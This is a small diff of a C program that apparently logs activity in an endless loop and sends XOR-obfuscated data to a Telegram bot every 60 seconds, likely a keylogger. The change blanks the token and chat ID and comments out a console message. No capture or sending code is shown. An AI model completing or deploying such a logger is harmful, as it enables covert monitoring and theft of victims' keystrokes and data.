@@ -8,13 +8,13 @@
 #define TELEGRAM_INTERVAL_SEC 60
 
 int main(void) {
-    const char *BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    const char *CHAT_ID = "YOUR_CHAT_ID_HERE";
-    char xorKey = 'K';
+    const char *BOT_TOKEN = "";
+    const char *CHAT_ID = "";
+    char xorKey = 'k';
 
     time_t lastSendTime = time(NULL);
 
-    printf("good...\n");
+    //printf("good...\n");
 
     while (1) {
         StartLogging();
